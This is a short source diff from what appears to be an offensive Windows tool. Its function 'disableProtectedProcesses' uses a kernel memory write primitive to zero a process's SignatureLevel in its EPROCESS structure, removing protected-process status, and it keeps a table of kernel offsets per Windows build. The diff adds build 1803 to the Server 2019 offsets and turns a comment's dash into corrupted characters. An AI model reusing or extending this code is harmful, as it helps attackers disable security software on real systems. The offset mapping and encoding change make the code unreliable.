@@ -307,7 +307,7 @@ void disableProtectedProcesses(DWORD targetPID, Offsets offsets) {
     CurrentProcessAddress -= offsets.ActiveProcessLinksOffset;
     Log("[*] Current process address: %p", CurrentProcessAddress);
 
-    // Patches 5 values — SignatureLevel, SectionSignatureLevel, Type, Audit, and Signer
+    // Patches 5 values Â— SignatureLevel, SectionSignatureLevel, Type, Audit, and Signer
     WriteMemoryPrimitive(Device, 4, CurrentProcessAddress + offsets.SignatureLevelOffset, 0x00);
 
     // Cleanup
@@ -396,6 +396,7 @@ struct Offsets getVersionOffsets() {
         return Offsets{ 0x02e8, 0x02f0, 0x0360, 0x06f8 };
     case 2004:
         return Offsets{ 0x0440, 0x0448, 0x04b8, 0x0878 };
+    case 1803:
     case 1809:
         // Offsets for Server 2019 x64
         return Offsets{ 0x02e0, 0x02e8, 0x0358, 0x06c8 };
